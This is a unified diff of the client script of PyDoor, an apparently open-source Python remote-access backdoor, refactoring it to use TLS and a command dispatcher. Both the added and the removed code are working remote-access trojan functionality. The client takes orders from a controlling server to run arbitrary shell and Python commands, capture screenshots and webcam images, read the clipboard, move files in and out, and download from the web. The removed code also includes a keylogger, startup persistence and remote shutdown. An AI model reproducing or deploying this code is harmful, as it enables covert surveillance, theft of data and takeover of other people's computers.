@@ -1,395 +1,342 @@
-"""
-https://github.com/Y4hL/PyDoor
-
-Author(s): Y4hL
-
-License: [gpl-3.0](https://www.gnu.org/licenses/gpl-3.0.html)
-"""
+""" PyDoor Client """
 import os
-import sys
-import time
+import ssl
 import json
-import getpass
-import logging
 import socket
-import shutil
+import logging
+import getpass
 import platform
 import subprocess
-from pydoc import help
-from zipfile import ZipFile
+import queue
+from contextlib import suppress
 
-from psutil import AccessDenied
+from modules import clipboard, download, screen, webcam, windows, pyshell
+from utils.baseclient import Client
+from utils import tasks
 
-from utils.process import kill, ps
-from utils.errors import errors
-from utils.esocket import ESocket
-from utils.file import reverse_readline
+logging.basicConfig(level=logging.DEBUG)
 
-from modules import web
-from modules import screen
-from modules import webcam
-from modules import pyshell
-from modules import keylogger
-from modules import clipboard
-from modules import persistance
+BLOCK_SIZE = 32768
 
 
-if getattr(sys, 'frozen', False):
-    CLIENT_PATH = os.path.dirname(sys.executable)
-elif __file__:
-    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))
+class CommandClient(Client):
+    """ Client for managing commands """
 
-os.chdir(CLIENT_PATH)
-LOG = os.path.join(CLIENT_PATH, 'log.log')
+    # List of tasks that have output, but timed out
+    task_list: list[tasks.Task] = []
 
-if platform.system() == 'Windows':
-    import ctypes
+    def __init__(self, ssl_context: ssl.SSLContext):
+        Client.__init__(self, ssl_context)
 
+    def listen(self):
+        """ Listen for coming commands """
+        # Wait for a command to arrive
+        command = self.read().decode()
+        match command:
+            case 'PING':
+                self.ping()
+            case "CWD":
+                self.cwd()
+            case "SYSTEM":
+                self.system()
+            case "USER":
+                self.user()
+            case "HOME":
+                self.home()
+            case "HOSTNAME":
+                self.hostname()
+            case 'SHELL':
+                self.shell()
+            case 'PYTHON':
+                self.interpreter()
+            case 'SCREENSHOT':
+                self.screenshot()
+            case 'WEBCAM':
+                self.webcam()
+            case 'COPY':
+                self.copy()
+            case 'PASTE':
+                self.paste()
+            case 'SEND_FILE':
+                self.send_file()
+            case 'RECEIVE_FILE':
+                self.receive_file()
+            case 'DOWNLOAD':
+                self.download()
+            case 'LOCK':
+                self.lock()
+            case 'TASKS':
+                self.get_tasks()
+            case 'STOPTASK':
+                self.stoptask()
+            case 'TASKOUTPUT':
+                self.taskoutput()
+            case _:
+                logging.debug('Received unrecognized command: %s', command)
 
-logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
-logging.info('Client Started.')
+    def ping(self):
+        """ Respond to server ping """
+        logging.info("Responding to server ping")
+        self.write(b'PONG')
 
+    def cwd(self):
+        """ Send cwd to server """
+        logging.info("Sending cwd to server")
+        self.write(os.getcwdb())
 
-class Client(object):
-    """ Client Object """
+    def system(self):
+        """ Send platform to server """
+        logging.info("Sending system to server")
+        self.write(platform.system().encode())
 
-    # ESocket
-    esock = None
-    sock = socket.socket()
+    def user(self):
+        """ Send user to server """
+        logging.info("Sending user to server")
+        self.write(getpass.getuser().encode())
 
-    def __init__(self) -> None:
+    def home(self):
+        """ Send home to server """
+        logging.info("Sending home to server")
+        self.write(os.path.expanduser('~').encode())
 
-        # Try to run keylogger
-        self.keylogger = keylogger.Keylogger()
-        if self.keylogger.runnable:
-            try:
-                for line in reverse_readline(LOG):
-                    if 'Started Keylogger' in line:
-                        self.keylogger.start()
-                        break
-                    if 'Stopped Keylogger' in line:
-                        break
-            except Exception:
-                logging.error('error reading log')
+    def hostname(self):
+        """ Send hostname to server """
+        logging.info("Sending hostname to server")
 
-        if platform.system() == 'Windows':
-            self._pwd = ' && cd'
-        else:
-            self._pwd = ' && pwd'
+        hostname = socket.gethostname()
+        # Remove .local ending on macos
+        if platform.system() == "Darwin" and hostname.endswith(".local"):
+            hostname = hostname[:-len(".local")]
 
-    def connect(self, address) -> None:
-        """ Connect to a remote socket """
+        self.write(hostname.encode())
+
+    def shell(self):
+        """ Open a shell for peer """
+        command = self.read().decode()
+        logging.info('Executing shell command: %s', command)
+        output = subprocess.run(command, shell=True, capture_output=True, check=False)
+        self.write(output.stdout + output.stderr)
+
+    def interpreter(self):
+        """ Open python interpreter for peer """
+        command = self.read().decode()
+
+        # Create task
+        task = pyshell.pyshell(command)
+
+        # Define timeout until task is put into background
+        timeout = 50
+
         try:
-            self.sock.connect(address)
-        except (ConnectionRefusedError, TimeoutError):
-            raise
+            output: str = task.output.get(timeout=timeout)
+        except queue.Empty:
+            # Add task to background tasks
+            self.task_list.append(task)
+            self.write(f'Timed out after {timeout}s.\n'.encode())
+        else:
+            self.write(output.encode())
+
+    def screenshot(self):
+        """ Take a screenshot """
+        logging.debug('Capturing screenshot')
+        try:
+            data = screen.screenshot()
+        except RuntimeError as error:
+            error_message = f'{error.__class__.__name__}: {str(error)}'
+            logging.error('Error taking screenshot: %s', error_message)
+            data = ('ERROR: ' + error_message).encode()
+        else:
+            logging.info('Successfully captured screenshot')
+        self.write(data)
+
+    def webcam(self):
+        """ Capture webcam """
+        logging.debug('Capturing webcam')
+        try:
+            img_data = webcam.capture_webcam()
+        except RuntimeError:
+            logging.error('Could not capture webcam')
+            img_data = b'ERROR'
+        else:
+            logging.info('Captured webcam')
+        self.write(img_data)
+
+    def copy(self):
+        """ Copy to clipboard """
+        logging.debug('Attempting to copy to clipboard')
+        data = self.read().decode()
+        try:
+            clipboard.copy(data)
+        except RuntimeError as error:
+            logging.error('Error occurred copying to clipboard: %s', str(error))
+            self.write(str(error).encode())
+        else:
+            logging.info('Copied "%s" to clipboard', data)
+            self.write(b'SUCCESS')
+
+    def paste(self):
+        """ Paste from clipboard """
+        logging.debug('Attempting to paste from clipboard')
+        try:
+            content = clipboard.paste()
+        except RuntimeError as error:
+            logging.error('Error occurred pasting from clipboard: %s', str(error))
+            self.write(str(error).encode())
+        else:
+            if content is None:
+                content = ''
+            logging.info('Pasted "%s" from clipboard', content)
+            self.write(b'SUCCESS')
+            self.write(content.encode())
+
+    def send_file(self):
+        """ Send a file to server """
+        logging.debug('Sending file to server')
+        filename = self.read().decode()
+        try:
+            with open(filename, 'rb') as file:
+                # Confirm file was successfully opened
+                self.write(b'FILE_OPENED')
+                # Transfer file
+                self.ssl_sock.sendfile(file=file)
+
+            # Indicate transfer has completed
+            self.ssl_sock.sendall(b"FILE_TRANSFER_COMPLETE")
+
+        except (FileNotFoundError, PermissionError) as error:
+            # Send error instead of FILE_OPENED
+            logging.error('Error opening file %s: %s', filename, str(error))
+            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
+        else:
+            logging.info('Successfully transferred file %s to server', str(filename))
+
+    def receive_file(self):
+        """ Receive file from server """
+        logging.debug('Attempting to receive file from server')
+        filename = self.read().decode()
+        try:
+            with open(filename, 'wb') as file:
+                self.write(b'FILE_OPENED')
+                while True:
+                    block = self.ssl_sock.recv(4096)
+                    if block == b'FILE_TRANSFER_COMPLETE':
+                        break
+                    file.write(block)
+
+        except PermissionError as error:
+            logging.error('Insufficient permissions writing to file "%s" during receive', filename)
+            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
+        else:
+            logging.info("Transferred '%s' from server successfully", filename)
+
+    def download(self):
+        """ Download a file from the web """
+        logging.debug("Attempting to download file from the web")
+        url, filename = json.loads(self.read().decode())
+
+        try:
+            task = download.download(url, filename)
+        except TimeoutError:
+            logging.error("Download of '%s' timed out", url)
+            self.write(b"Download timed out.")
+        except (RuntimeError, OSError) as error:
+            logging.error("Error downloading file from the web: %s", str(error))
+            self.write(str(error).encode())
+        else:
+            # Add task to task_list
+            self.task_list.append(task)
+            logging.info("Downloading file from '%s' as '%s'", url, filename)
+            self.write(b'Success')
+
+    def lock(self):
+        """ Lock Machine (Windows only) """
+        logging.debug("Attempting to lock machine")
+
+        try:
+            windows.lock()
+        except AttributeError as error:
+            logging.error("Could not lock machine: %s", str(error))
+            self.write(b"Locking is only supported on Windows.")
         except OSError as error:
-            # Usually raised when socket is already connected
-            # Close socket -> Reconnect
-            logging.error('%s: Attempting reconnect' % str(error))
-            self.sock.close()
-            self.sock = socket.socket()
-            raise
-        except Exception as error:
-            logging.error(errors(error))
-            raise
-        logging.info('Connected to server: %s' % (str(address)))
-        self.esock = ESocket(self.sock)
-        try:
-            self.esock.send(socket.gethostname().encode())
-        except socket.error as error:
-            logging.error(errors(error))
-        self.address = address
-
-    def send_json(self, data) -> None:
-        """ Send JSON data to Server """
-        self.esock.send(json.dumps(data).encode())
-
-    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
-        """ Send file to Server """
-        # returns None
-        try:
-            with open(file_to_transfer, 'rb') as file:
-                while True:
-                    block = file.read(block_size)
-                    if not block:
-                        break
-                    self.esock.send(block)
-
-        except (FileNotFoundError, PermissionError) as error:
-            self.esock.send(errors(error).encode(), '1')
-            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
+            logging.error("Could not lock machine: %s", str(error))
+            self.write(str(error).encode())
         else:
-            self.esock.send(b'FILE_TRANSFER_DONE', '9')
-            logging.info('Transferred %s to Server', file_to_transfer)
+            logging.info("Locked machine")
+            self.write(b'LOCKED')
 
-    def receive_file(self, save_as: str) -> None:
-        """ Receive File from Server"""
-        # returns None
+    def get_tasks(self):
+        """ Get current tasks (background threads), removes fully processed ones """
+        task_info = []
+        tasks.clean(self.task_list)
 
-        try:
-            with open(save_as, 'wb') as file:
-                self.esock.send(b'Successfully opened file.')
-                while True:
-                    _, data = self.esock.recv()
-                    if data == b'FILE_TRANSFER_DONE':
-                        break
-                    file.write(data)
+        for task in self.task_list:
+            info = [task.identifer, task.native_id if task.is_alive() else None]
+            info.extend(json.loads(task.name))
 
-        except (FileNotFoundError, PermissionError) as error:
-            self.esock.send(errors(error).encode(), error='1')
-            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
-        else:
-            logging.info('Transferred %s to Client', save_as)
+            task_info.append(info)
 
-    def receive_commands(self) -> None:
-        """ Receives Commands from Server """
-        while True:
-            error, msg = self.esock.recv()
-            data = json.loads(msg.decode())
+        self.write(json.dumps(task_info).encode())
 
-            if data[0] == 'GETCWD':
-                self.esock.send(os.getcwdb())
-                continue
+    def stoptask(self):
+        """ Stop a running task """
+        task_id = self.read().decode()
+        logging.debug("Attempting to stop task (%s)", task_id)
 
-            if data[0] == 'LIST':
-                continue
+        task = tasks.find(self.task_list, task_id)
 
-            if data[0] == 'PLATFORM':
-                self.esock.send(platform.system().encode())
-                continue
+        if task is None:
+            self.write(b'Task could not be found.')
+            logging.debug("Task (%s) could not be found.", task_id)
+            return
 
-            if data[0] == 'LOG_FILE':
-                self.esock.send(LOG.encode())
-                continue
+        if task.stop is None:
+            self.write(b'Task does not support stopping.')
+            logging.debug("Task %s (%s) does not support stopping. ", task.name, task_id)
+            return
 
-            if data[0] == '_INFO':
-                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
-                continue
+        # Stop task
+        task.stop.set()
+        logging.debug("Task stopped: %s (%s)", task.name, task_id)
+        self.write(b'STOPPED')
 
-            if data[0] == 'FROZEN':
-                self.send_json(getattr(sys, 'frozen', False))
-                continue
+    def taskoutput(self):
+        """ Get the output of a task if available """
+        task_id = self.read().decode()
+        logging.debug("Attempting to get task (%s) output", task_id)
 
-            if data[0] == 'PS':
-                self.send_json(ps())
-                continue
+        task = tasks.find(self.task_list, task_id)
 
-            if data[0] == 'KILL':
-                try:
-                    kill(data[1])
-                except AccessDenied:
-                    self.esock.send(b'Access Denied', '1')
-                else:
-                    self.esock.send(b'Killed')
-                continue
+        if task is None:
+            self.write(b'Task could not be found.')
+            logging.debug("Task (%s) could not be found.", task_id)
+            return
 
-            if data[0] == 'EXEC':
-                output, error = pyshell.pyshell(data[1])
-                self.send_json([output, error])
-                continue
+        if task.output is None:
+            self.write(b'Task does not support output.')
+            logging.debug("Task (%s) does not return output.", task_id)
+            return
 
-            if data[0] == 'RESTART_SESSION':
-                self.send_json(True)
-                logging.info('Restarting session')
-                break
+        if task.output.qsize() == 0:
+            self.write(b'Task is not ready.')
+            logging.debug("Task (%s) is not ready", task_id)
+            return
 
-            if data[0] == 'CLOSE':
-                try:
-                    self.send_json(True)
-                    logging.info('Closing connection and exiting')
-                    self.esock.close()
-                except Exception:
-                    pass
-                sys.exit(0)
-
-            if data[0] == 'ADD_STARTUP':
-                self.send_json(persistance.add_startup())
-                continue
-
-            if data[0] == 'REMOVE_STARTUP':
-                self.send_json(persistance.remove_startup())
-                continue
-
-            if data[0] == 'LOCK':
-                if platform.system() == 'Windows':
-                    self.send_json(True)
-                    ctypes.windll.user32.LockWorkStation()
-                    logging.info('Locked workstation')
-                else:
-                    self.send_json(False)
-                continue
-
-            if data[0] == 'SHUTDOWN':
-                if platform.system() != 'Windows':
-                    self.send_json(False)
-                    continue
-                self.send_json(True)
-                logging.info('Shutting down system')
-                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                time.sleep(5)
-                break
-
-            if data[0] == 'RESTART':
-                if platform.system() != 'Windows':
-                    self.send_json(False)
-                    continue
-                self.send_json(True)
-                logging.info('Restarting system')
-                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                time.sleep(5)
-                break
-
-            if data[0] == 'RECEIVE_FILE':
-                self.send_file(data[1])
-                continue
-
-            if data[0] == 'SEND_FILE':
-                self.receive_file(data[1])
-                continue
-
-            if data[0] == 'ZIP_FILE':
-                try:
-                    with ZipFile(data[1], 'w') as ziph:
-                        ziph.write(data[2])
-                except Exception as err:
-                    logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
-                    self.send_json(errors(err))
-                else:
-                    logging.info('Zipped file %s into %s' % (data[2], data[1]))
-                    self.send_json(None)
-                continue
-
-            if data[0] == 'ZIP_DIR':
-                logging.info('Zipping Folder: %s', data[2])
-                try:
-                    shutil.make_archive(data[1], 'zip', data[2])
-                except Exception as error:
-                    logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
-                    self.send_json(errors(error))
-                else:
-                    logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
-                    self.send_json(None)
-                continue
-
-            if data[0] == 'UNZIP':
-                try:
-                    with ZipFile(data[1], 'r') as ziph:
-                        ziph.extractall()
-                except Exception as error:
-                    logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
-                    self.send_json(errors(error))
-                else:
-                    logging.info('Unzipped %s' % data[1])
-                    self.send_json(None)
-                continue
-
-            if data[0] == 'DOWNLOAD':
-                error = web.download(data[1], data[2])
-                if error:
-                    self.send_json(error)
-                else:
-                    self.send_json(None)
-                continue
-
-            if data[0] == 'INFO':
-                self.esock.send(f'User: {getpass.getuser()}\n' \
-                    f'OS: {platform.system()} {platform.release()} ' \
-                    f'({platform.platform()}) ({platform.machine()})\n' \
-                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
-                continue
-
-            if data[0] == 'SCREENSHOT':
-                success, content = screen.screenshot()
-                if success:
-                    self.esock.send(content)
-                else:
-                    self.esock.send(content, '1')
-                continue
-
-            if data[0] == 'WEBCAM':
-                image = webcam.capture_webcam()
-                if image:
-                    self.esock.send(image)
-                else:
-                    self.esock.send(b'ERROR', '1')
-                continue
-
-            if data[0] == 'START_KEYLOGGER':
-                self.send_json(self.keylogger.start())
-                continue
-
-            if data[0] == 'KEYLOGGER_STATUS':
-                self.send_json(self.keylogger.state())
-
-            if data[0] == 'STOP_KEYLOGGER':
-                self.send_json(self.keylogger.stop())
-                continue
-
-            if data[0] == 'COPY':
-                self.send_json(clipboard.copy(data[1]))
-                continue
-
-            if data[0] == 'PASTE':
-                self.send_json(clipboard.paste())
-                continue
-
-            if data[0] == 'SHELL':
-
-                execute = lambda command: subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                split_command = data[1].split(' ')[0].strip().lower()
-
-                if split_command in ['cd', 'chdir']:
-                    process = execute(data[1] + self._pwd)
-                    error = process.stderr.read().decode()
-                    if error:
-                        self.send_json(['ERROR', error])
-                        continue
-                    output = process.stdout.read().decode()
-                    # Command should only return one line (cwd)
-                    if output.count('\n') > 1:
-                        self.send_json(['ERROR', output])
-                        continue
-                    os.chdir(output.strip())
-                    self.send_json([os.getcwd()])
-                    continue
-
-                process = execute(data[1])
-                for line in iter(process.stdout.readline, ''):
-                    if line == b'':
-                        break
-                    self.esock.send(line.replace(b'\n', b''))
-                    if self.esock.recv()[1] == b'QUIT':
-                        kill(process.pid)
-                        break
-                self.esock.send(process.stderr.read())
-                self.esock.recv()
-                self.esock.send(b'DONE', '1')
-                continue
-
-
-def main(address: tuple, retry_timer: int = 10) -> None:
-    """ Run Client """
-    # RETRY_TIMER: Time to wait before trying to reconnect
-    client = Client()
-    logging.info('Starting connection loop')
-    while True:
-        try:
-            client.connect(address)
-        except Exception as error:
-            print(error)
-            time.sleep(retry_timer)
-        else:
-            break
-    try:
-        client.receive_commands()
-    except Exception as error:
-        logging.critical(errors(error))
+        output: str = task.output.get()
+        logging.debug("Task (%s) output: %s", task_id, output)
+        self.write(b'READY')
+        self.write(output.encode())
 
 
 if __name__ == '__main__':
 
-    # Add Client to Startup when Client is run
-    # add_startup()
+    # Create SSLContext
+    context = ssl.create_default_context(cafile="cert.pem")
+
+    # Connect to server
+    client = CommandClient(context)
+    client.connect(('localhost', 6969))
+
+    # Listen to commands indefinitely
     while True:
-        main(('', 8001))
+        with suppress(TimeoutError):
+            client.listen()
